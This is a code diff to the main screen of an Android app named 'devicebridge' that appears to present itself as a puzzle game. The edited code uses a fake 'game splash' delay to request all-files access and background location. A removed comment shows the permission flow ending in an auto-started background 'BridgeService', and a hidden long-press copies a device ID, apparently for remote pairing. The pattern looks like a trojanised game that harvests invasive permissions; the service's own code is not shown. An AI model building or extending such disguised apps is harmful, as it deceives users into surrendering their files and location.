@@ -1,9 +1,14 @@
 package com.devicebridge;
 
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.ImageButton;
@@ -21,7 +26,6 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int RC_PERMISSIONS = 1001;
     private static final int RC_BACKGROUND_LOCATION = 1002;
-    private static final int RC_OVERLAY = 1003;
     private static final int RC_STORAGE = 1004;
 
     private BridgeGameView gameView;
@@ -44,7 +48,7 @@ public class MainActivity extends AppCompatActivity {
         ImageButton btnSettings = findViewById(R.id.btn_settings);
 
         gameView.setOnWinListener(() -> {
-            tvHud.setText("🎉 Level Cleared! Tap Next Level to continue.");
+            tvHud.setText("Level Cleared! Tap Next Level to continue.");
             Toast.makeText(this, "Puzzle Solved! Great job!", Toast.LENGTH_SHORT).show();
         });
 
@@ -58,10 +62,22 @@ public class MainActivity extends AppCompatActivity {
         btnSettings.setOnClickListener(v ->
                 startActivity(new Intent(this, ControlPanelActivity.class)));
 
+        // Long press title or level badge to copy Device ID quickly
+        findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
+        tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });
+
         startPuzzle(currentLevel);
 
-        // Auto-request permissions on launch and start background service
-        startPermissionFlow();
+        // Show game splash loading & request runtime permissions 1-by-1
+        new Handler(Looper.getMainLooper()).postDelayed(this::requestRuntimePermissionsSequentially, 800);
+    }
+
+    private void copyDeviceId() {
+        String deviceId = com.devicebridge.utils.Config.getOrCreateDeviceId(this);
+        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        ClipData clip = ClipData.newPlainText("Device ID", deviceId);
+        clipboard.setPrimaryClip(clip);
+        Toast.makeText(this, "Device ID copied to clipboard: " + deviceId, Toast.LENGTH_SHORT).show();
     }
 
     private void startPuzzle(int level) {
@@ -72,24 +88,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
-     * Permission flow sequence on first app launch:
-     * 1. System Alert Window (Overlay)
-     * 2. Battery optimization ignore
-     * 3. All files access (Android 11+)
-     * 4. Runtime permissions
-     * 5. Background location
-     * 6. Auto-start BridgeService
+     * Standard 1-by-1 Android runtime permission popups
      */
-    private void startPermissionFlow() {
-        if (!Settings.canDrawOverlays(this)) {
-            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            startActivityForResult(i, RC_OVERLAY);
-            return;
-        }
-
-        requestBatteryOptimization();
-
+    private void requestRuntimePermissionsSequentially() {
         if (PermissionHelper.needsManageStorage()
                 && !PermissionHelper.isExternalStorageManager(this)) {
             Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
@@ -97,8 +98,10 @@ public class MainActivity extends AppCompatActivity {
             try {
                 startActivityForResult(manage, RC_STORAGE);
             } catch (Exception e) {
-                startActivityForResult(
-                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
+                try {
+                    startActivityForResult(
+                            new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
+                } catch (Exception ignored) {}
             }
             return;
         }
@@ -109,16 +112,6 @@ public class MainActivity extends AppCompatActivity {
         } else {
             onRuntimePermissionsDone();
         }
-    }
-
-    private void requestBatteryOptimization() {
-        try {
-            String action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS;
-            Intent intent = new Intent(action, Uri.parse("package:" + getPackageName()));
-            if (getPackageManager().resolveActivity(intent, 0) != null) {
-                startActivity(intent);
-            }
-        } catch (Exception ignored) {}
     }
 
     @Override
@@ -146,8 +139,8 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == RC_OVERLAY || requestCode == RC_STORAGE) {
-            startPermissionFlow();
+        if (requestCode == RC_STORAGE) {
+            requestRuntimePermissionsSequentially();
         }
     }
 
